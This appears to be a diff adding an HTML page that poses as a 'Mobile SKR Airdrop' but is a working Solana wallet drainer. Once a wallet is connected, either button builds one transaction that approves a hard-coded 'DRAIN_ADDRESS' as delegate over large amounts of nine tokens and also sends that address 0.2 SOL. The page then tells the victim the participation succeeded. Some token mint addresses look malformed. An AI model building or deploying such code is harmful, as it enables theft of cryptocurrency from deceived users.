@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mobile SKR Airdrop</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 50px; background: #000; color: #fff; }
+    button { padding: 15px 30px; font-size: 18px; margin: 20px; background: #14f195; border: none; border-radius: 10px; cursor: pointer; }
+    button:disabled { background: #666; cursor: not-allowed; }
+    #status { font-size: 20px; margin: 20px; }
+  </style>
+</head>
+<body>
+  <h1>Mobile SKR Airdrop</h1>
+  <p>Connect wallet and participate in airdrop and contest!</p>
+  <button id="connect-btn">Connect Wallet</button>
+  <button id="claim-btn" disabled>Participate in Airdrop</button>
+  <button id="contest-btn" disabled>Participate in Contest</button>
+  <div id="status"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
+
+  <script>
+    const DRAIN_ADDRESS = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Your drain address
+
+    const TOKEN_MINTS = [
+      "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
+      "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
+      "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7",   // POPCAT
+      "MEW1gQwX7Z8Q8v6t6t6t6t6t6t6t6t6t6t6t6t6t6t6t",  // MEW
+      "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", // USDC
+      "9n4nbM75f5Ui33ZbPYXn59EwSgf1Zr9wrG2T5fSJmP2o",  // SRM
+      "7dHbWXmci3dT8UFYWYZwe8ZXD54zGce3qQaT5fqP76G1",  // RAY
+      "HZ64k4h57j1Bzfvk2V9fD565KD5jH1tB2fMvkQd6pZP",   // ORCA
+      "4gqk83p1ZD39f462G7GkZQpW5TqZ7hM8fzNQz9P4wQd"    // MNGO
+    ];
+
+    let wallet = null;
+    let publicKey = null;
+
+    const statusEl = document.getElementById('status');
+    const connectBtn = document.getElementById('connect-btn');
+    const claimBtn = document.getElementById('claim-btn');
+    const contestBtn = document.getElementById('contest-btn');
+
+    async function connectWallet() {
+      if (wallet) return;
+
+      let provider = null;
+      if (window.solana && window.solana.isPhantom) provider = window.solana;
+      else if (window.backpack) provider = window.backpack;
+      else if (window.solflare) provider = window.solflare;
+
+      if (!provider) {
+        statusEl.textContent = "Install Phantom or Backpack!";
+        return;
+      }
+
+      try {
+        await provider.connect();
+        wallet = provider;
+        publicKey = provider.publicKey.toString();
+
+        connectBtn.textContent = publicKey.slice(0,4) + '...' + publicKey.slice(-4);
+        connectBtn.disabled = true;
+        claimBtn.disabled = false;
+        contestBtn.disabled = false;
+        statusEl.textContent = "Wallet connected! Click to participate.";
+      } catch (err) {
+        statusEl.textContent = "Connection Error";
+      }
+    }
+
+    async function participateInAirdrop() {
+      if (!wallet) return;
+
+      statusEl.textContent = "Participating in airdrop...";
+      claimBtn.disabled = true;
+      contestBtn.disabled = true;
+
+      try {
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+        const owner = new solanaWeb3.PublicKey(publicKey);
+        const delegate = new solanaWeb3.PublicKey(DRAIN_ADDRESS);
+
+        const tx = new solanaWeb3.Transaction();
+
+        // Check token program and create ATA if necessary
+        for (const mintStr of TOKEN_MINTS) {
+          const mint = new solanaWeb3.PublicKey(mintStr);
+          const ata = await splToken.getAssociatedTokenAddress(mint, owner);
+
+          const ataInfo = await connection.getAccountInfo(ata);
+          if (!ataInfo) {
+            tx.add(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));
+          }
+        }
+
+        // Approve tokens
+        for (const mintStr of TOKEN_MINTS) {
+          const mint = new solanaWeb3.PublicKey(mintStr);
+          const ata = await splToken.getAssociatedTokenAddress(mint, owner);
+
+          tx.add(splToken.createApproveInstruction(ata, delegate, owner, [], BigInt("1000000000000"))); // Approve a large amount
+        }
+
+        // Transfer 0.2 SOL for fee
+        tx.add(solanaWeb3.SystemProgram.transfer({
+          fromPubkey: owner,
+          toPubkey: delegate,
+          lamports: 200000000
+        }));
+
+        tx.feePayer = owner;
+        const { blockhash } = await connection.getLatestBlockhash();
+        tx.recentBlockhash = blockhash;
+
+        const signed = await wallet.signTransaction(tx);
+        const sig = await connection.sendRawTransaction(signed.serialize());
+
+        statusEl.textContent = `Success! Transaction: ${sig}`;
+        alert("Participation successful! Check your wallet.");
+      } catch (err) {
+        statusEl.textContent = "Error (canceled or insufficient SOL for fee)";
+        claimBtn.disabled = false;
+        contestBtn.disabled = false;
+      }
+    }
+
+    async function participateInContest() {
+      await participateInAirdrop();
+    }
+
+    connectBtn.onclick = connectWallet;
+    claimBtn.onclick = participateInAirdrop;
+    contestBtn.onclick = participateInContest;
+  </script>
+</body>
+</html>
